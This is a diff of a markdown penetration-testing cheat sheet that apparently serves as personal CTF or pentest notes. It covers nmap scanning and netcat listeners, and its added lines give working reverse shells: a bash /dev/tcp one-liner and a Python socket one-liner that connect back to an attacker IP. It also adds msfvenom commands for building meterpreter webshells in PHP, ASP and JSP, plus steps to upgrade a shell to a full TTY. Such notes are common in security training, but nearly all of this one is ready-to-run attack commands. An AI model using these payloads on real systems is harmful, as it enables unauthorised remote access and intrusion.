@@ -1,6 +1,6 @@
 ## Port scanning
 ### Nmap
-* `nmap -sC -sV -oA <FILENAME> <IP>`
+* `nmap -sC -sV -oA <FILENAME> <TARGETIP>`
   * Default script, version detection, output to file 
   * [Explanation](https://www.cleancss.com/explain-command/nmap/4068984)
 
@@ -25,16 +25,24 @@
 ### Listen for connections
 * `nc –nlvp <PORT>`
     * [Explanation](https://www.cleancss.com/explain-command/index.php?string=nc+-l+-v+-p)
-### Bash
-* `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`
+### RCE
+* Bash - `bash -i >& /dev/tcp/<ATTACKERIP>/<ATTACKERPORT> 0>&1`
+* Python - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKERIP>",<ATTACKERPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
+
+### Webshells
+* `msfvenom -p <PAYLOAD> LHOST=<ATTACKERIP> LPORT=<ATTACKERPORT> -f raw > example.<EXT>`
+  * PHP - `php/meterpreter_reverse_tcp`
+  * ASP - `windows/meterpreter/reverse_tcp`
+  * JSP - `java/jsp_shell_reverse_tcp`
+* Kali - `/usr/share/webshells/` (ASP, ASPX, CFM, JSP, PERL, PHP)
 
 ### TTY shell
 1. Open netcat session
-1. `python -c 'import pty; pty.spawn("/bin/bash")'`
-2. `export TERM=xterm`
-3. `CTRL+Z`
-4. `stty raw -echo`
-5. `fg`
+2. `python -c 'import pty; pty.spawn("/bin/bash")'`
+3. `export TERM=xterm`
+4. `CTRL+Z`
+5. `stty raw -echo`
+6. `fg`
 
 [Other methods of spawning a TTY Shell](https://netsec.ws/?p=337)
 
